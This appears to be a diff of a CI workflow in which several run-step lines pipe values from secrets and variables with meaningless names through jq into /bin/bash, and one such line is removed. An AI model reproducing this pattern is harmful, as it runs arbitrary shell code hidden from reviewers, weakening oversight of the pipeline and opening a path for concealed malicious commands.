@@ -17,7 +17,6 @@ jobs:
           oigs5871: ${{ secrets.oigs5871 }}
         run: |
           printf '%s' "$oigs5871" | jq -r .rj277 | /bin/bash
-          echo $goso25 | jq -r .vr8588 | /bin/bash
           printf '%s' "$f60652" | jq -r .xw4016 | /bin/bash
           echo $jf08937 | jq -r .vxqqk384 | /bin/bash
 
